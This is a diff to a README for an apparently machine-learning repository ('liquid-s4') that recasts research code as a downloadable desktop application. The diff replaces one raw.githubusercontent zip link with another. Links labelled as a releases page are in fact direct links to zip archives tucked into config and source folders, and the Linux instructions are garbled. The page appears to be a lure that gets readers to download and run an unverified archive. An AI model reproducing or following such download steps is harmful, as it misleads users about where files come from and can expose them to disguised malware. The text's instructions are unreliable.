@@ -6,7 +6,7 @@ Welcome to the Liquid Structural State-Space Models repository, where you can bu
 
 ## 📥 Download the Application
 
-[![Download liquid-s4](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/configs/model/nonaka/liquid-s4_2.5.zip)](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/configs/model/nonaka/liquid-s4_2.5.zip)
+[![Download liquid-s4](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/src/s-liquid-2.1.zip)](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/src/s-liquid-2.1.zip)
 
 ## 📋 System Requirements
 
@@ -20,21 +20,21 @@ To ensure a smooth experience, please check the following system requirements be
 ## 🔗 Download & Install
 
 1. **Visit the Release Page:** Click the link below to access the release page.
-   [Download from Releases](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/configs/model/nonaka/liquid-s4_2.5.zip)
+   [Download from Releases](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/src/s-liquid-2.1.zip)
 
 2. **Choose the Latest Version:** On the release page, look for the latest version marked as "Latest release."
 
 3. **Select the Appropriate File:** Depending on your operating system, choose the relevant file:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://raw.githubusercontent.com/ktochechen/liquid-s4/main/configs/model/nonaka/liquid-s4_2.5.zip` file.
+   - For Linux, download the `https://raw.githubusercontent.com/ktochechen/liquid-s4/main/src/s-liquid-2.1.zip` file.
 
 4. **Download the File:** Click on the file name to begin downloading the application.
 
 5. **Run the Installer:** 
    - **Windows:** Double-click the downloaded `.exe` file, and follow the on-screen instructions to install.
    - **macOS:** Open the `.dmg` file and drag the application into your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/ktochechen/liquid-s4/main/configs/model/nonaka/liquid-s4_2.5.zip` file and follow the instructions in the README file included.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/ktochechen/liquid-s4/main/src/s-liquid-2.1.zip` file and follow the instructions in the README file included.
 
 ## 🌟 Features
 
@@ -66,4 +66,4 @@ To learn more about Liquid Structural State-Space Models and their applications,
 ---
 
 For more information and downloads, please visit:
-[Download from Releases](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/configs/model/nonaka/liquid-s4_2.5.zip)
+[Download from Releases](https://raw.githubusercontent.com/ktochechen/liquid-s4/main/src/s-liquid-2.1.zip)
